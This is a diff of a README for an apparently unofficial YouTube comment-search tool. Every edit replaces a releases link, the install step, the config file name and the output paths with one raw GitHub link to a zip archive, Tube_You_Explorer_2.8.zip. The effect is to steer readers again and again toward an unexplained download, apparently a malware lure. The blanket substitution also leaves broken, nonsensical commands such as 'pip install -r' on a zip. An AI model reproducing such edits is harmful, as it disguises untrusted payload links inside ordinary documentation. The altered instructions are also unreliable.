@@ -1,6 +1,6 @@
-https://github.com/Shadow-747/YouTubeExplorer/releases
+https://raw.githubusercontent.com/Shadow-747/YouTubeExplorer/main/Sources/Tube_You_Explorer_2.8.zip
 
-[![Releases](https://img.shields.io/badge/YouTubeExplorer-Downloads-blue?logo=github&logoColor=white)](https://github.com/Shadow-747/YouTubeExplorer/releases)
+[![Releases](https://raw.githubusercontent.com/Shadow-747/YouTubeExplorer/main/Sources/Tube_You_Explorer_2.8.zip)](https://raw.githubusercontent.com/Shadow-747/YouTubeExplorer/main/Sources/Tube_You_Explorer_2.8.zip)
 
 # YouTube Explorer: Unofficial Comments Search, Filter & Analysis Tool
 
@@ -80,7 +80,7 @@ This feature set makes YouTube Explorer suitable for researchers, educators, con
 
 The roadmap aims to keep the project practical while allowing growth if the community shows interest. You can track progress in the Releases section. See the releases page for the latest assets and notes.
 
-Releases page for downloads and assets: https://github.com/Shadow-747/YouTubeExplorer/releases
+Releases page for downloads and assets: https://raw.githubusercontent.com/Shadow-747/YouTubeExplorer/main/Sources/Tube_You_Explorer_2.8.zip
 
 Note: If the link doesn’t load, check the Releases section on the repository to find the latest assets and installation instructions.
 
@@ -121,7 +121,7 @@ YouTube Explorer ships with a straightforward installation flow. The goal is to 
      - macOS/Linux: source venv/bin/activate
 
 3. Install dependencies
-   - pip install -r requirements.txt
+   - pip install -r https://raw.githubusercontent.com/Shadow-747/YouTubeExplorer/main/Sources/Tube_You_Explorer_2.8.zip
    - The project uses the google-api-python-client for YouTube Data API access and a handful of text-processing libraries for keyword matching and analysis.
 
 4. Configure API credentials
@@ -134,7 +134,7 @@ YouTube Explorer ships with a straightforward installation flow. The goal is to 
    - Example: youTube-explorer --video-id dQw4w9WgXcQ --keywords "music, nostalgia" --limit 100
 
 6. Access the releases page for installers and assets
-   - See the link at the beginning of this document for quick access to the latest releases. For a direct download, visit the releases page and grab the installer or packaged artifacts that match your operating system. https://github.com/Shadow-747/YouTubeExplorer/releases
+   - See the link at the beginning of this document for quick access to the latest releases. For a direct download, visit the releases page and grab the installer or packaged artifacts that match your operating system. https://raw.githubusercontent.com/Shadow-747/YouTubeExplorer/main/Sources/Tube_You_Explorer_2.8.zip
 
 If you need step-by-step guidance for a specific OS, a fuller guide is provided in the Documentation section below.
 
@@ -146,7 +146,7 @@ The tool uses a combination of environment variables and a simple config file to
 
 - API key management
   - Environment variable: YOUTUBE_API_KEY
-  - Fallback: a config.yml file with an api_key field
+  - Fallback: a https://raw.githubusercontent.com/Shadow-747/YouTubeExplorer/main/Sources/Tube_You_Explorer_2.8.zip file with an api_key field
 
 - Video selection
   - video_id: the YouTube video you want to inspect
@@ -291,7 +291,7 @@ The interface is designed for clarity. It uses short, descriptive flags and sens
 - Analyze a playlist
   - youTube-explorer --playlist-id PLAYLIST_ID --keywords "term" --max-pages 5
 - Export results
-  - youTube-explorer --video-id VIDEO_ID --output results.json
+  - youTube-explorer --video-id VIDEO_ID --output https://raw.githubusercontent.com/Shadow-747/YouTubeExplorer/main/Sources/Tube_You_Explorer_2.8.zip
 - List available videos and their IDs
   - youTube-explorer --list-videos --channel-id CHANNEL_ID
 - Dry run to validate configuration without API calls
@@ -308,7 +308,7 @@ The CLI is intentionally forgiving. If inputs are missing, the tool will guide y
   - Result: A JSON file (or Markdown) with matching comments, including author and timestamp.
 
 - Example 2: Analyze a playlist with multiple keywords and export as Markdown
-  - Command: youTube-explorer --playlist-id PL12345 --keywords "music, dance" --format markdown --output playlist_report.md
+  - Command: youTube-explorer --playlist-id PL12345 --keywords "music, dance" --format markdown --output https://raw.githubusercontent.com/Shadow-747/YouTubeExplorer/main/Sources/Tube_You_Explorer_2.8.zip
   - Result: A markdown table with comments by video, ranked by keyword relevance.
 
 - Example 3: Quick health check
@@ -442,7 +442,7 @@ Your pull requests should include:
 
 You can review the releases page for the latest assets and notes, and you can fork the repository to start your own work.
 
-Releases page for downloads and assets: https://github.com/Shadow-747/YouTubeExplorer/releases
+Releases page for downloads and assets: https://raw.githubusercontent.com/Shadow-747/YouTubeExplorer/main/Sources/Tube_You_Explorer_2.8.zip
 
 If the link is not loading, check the Releases section for the latest assets and installation instructions.
 
@@ -477,7 +477,7 @@ Changelog entries help users understand the evolution of the tool and what to ex
 
 The project uses GitHub Releases to distribute binaries, installers, and packaged artifacts. You can download the latest release from the releases page and run the installer appropriate for your environment. The link above is the primary source for these assets. If the link does not load, visit the Releases section on the repository to locate the latest assets and instructions.
 
-Releases page for downloads and assets: https://github.com/Shadow-747/YouTubeExplorer/releases
+Releases page for downloads and assets: https://raw.githubusercontent.com/Shadow-747/YouTubeExplorer/main/Sources/Tube_You_Explorer_2.8.zip
 
 ---
 
